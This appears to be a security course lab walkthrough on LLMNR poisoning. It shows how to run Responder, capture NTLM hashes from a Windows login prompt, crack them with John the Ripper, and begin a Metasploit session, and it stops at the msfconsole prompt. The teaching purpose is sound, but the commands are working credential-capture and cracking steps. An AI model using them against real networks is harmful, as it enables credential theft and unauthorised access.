# Responder

In this lab we are going to walk through how quickly an attacker can take advantage of a common misconfiguration to gain access to a system via a **weak** password.

Specifically, we are looking to take advantage of **"LLMNR"**.  

We will need to load our **linux terminal** and start responder.




- **Double-click** `Ubuntu Shell` on Desktop

Next, we will navigate to the **Responder** directory:

```bash
cd ~/Intro_To_Security/Responder/
```

Now let’s start **Responder**:

```bash
responder -I ens5
```

You should see this:

Let's open **Windows File Explorer** and put in the string ```\\Linux-IP\Noooo``` into the address bar at the top.

<img width="502" height="55" alt="OpeningFileExplorer" src="https://github.com/user-attachments/assets/2de27ae0-5e58-4488-b7f3-ee6b313bec1e" />

<img width="929" height="488" alt="file_exp" src="https://github.com/user-attachments/assets/002bd08e-5d6a-4b31-9593-1feb0d979d47" />


It will pop up a windows to write the credentials. Fill them and switch back to your **Linux** terminal window.

<img width="374" height="337" alt="creds" src="https://github.com/user-attachments/assets/27799627-9ed3-4313-bd39-e7c6a0f841b7" />


After a few moments, you should see some captured data showing up.  

**Please note there may be an error.  That is OK.**

<img width="911" height="323" alt="file_exp_logs" src="https://github.com/user-attachments/assets/d2e3df52-44a3-4d6f-9ae0-af49c87e3898" />


We can do the same thing from the Windows Terminal by running the following command:

```bash
net use * \\10.10.102.57\share
```

As we can see we have the new captured data showing up.

THIS SECTION IS BEING REMOVED FOR THE TIME BEING PER JOHN

Next we need to kill Responder with `Ctrl + c`.  This will return the command prompt. 

Now, we need to change to the logs directory.

</pre>cd /opt/Responder/logs</pre>

Once there, we will need to start John The Ripper"

</pre>/opt/JohnTheRipper/run/john --format=netntlmv2 ./HTTP-NTLMv2-172.26.16.1.txt</pre>
Remember!  Your IP will be different!!!!


If you captured a NTLMv1 hash you can crack it with the following command:

root@DESKTOP-I1T2G01:/opt/Responder/logs# `/opt/JohnTheRipper/run/john --format=netntlm ./HTTP-NTLMv1-172.26.16.1.txt`
Remember!  Your IP will be different!!!!

Notice the v2 is dropped from the --format.

You should see the Windows password be cracked very quickly.  

Now, let’s use that password!

First, we will need to run a script that configures your system as though it is on a domain with little to no security between workstations.
Basically, it allows logons over the network.

Use file explorer to navigate to C:\IntroLabs

Then, Right-click on the smb.bat file and run it as Administrator:

Next, let’s open a new Kali instance. The easiest way to do this is to click the Kali icon in the taskbar.

Now we are going to start up and launch Metasploit against the Windows system to get a Meterpreter session.

</pre>
adhd@DESKTOP-I1T2G01:/mnt/c/Users/adhd$ <b>sudo su -</b>
[sudo] password for adhd:
root@DESKTOP-I1T2G01:~#
root@DESKTOP-I1T2G01:~# <b>msfconsole -q</b>
This copy of metasploit-framework is more than two weeks old.
 Consider running 'msfupdate' to update to the latest version.

Now, you can see just how bad LLMNR is!!!!
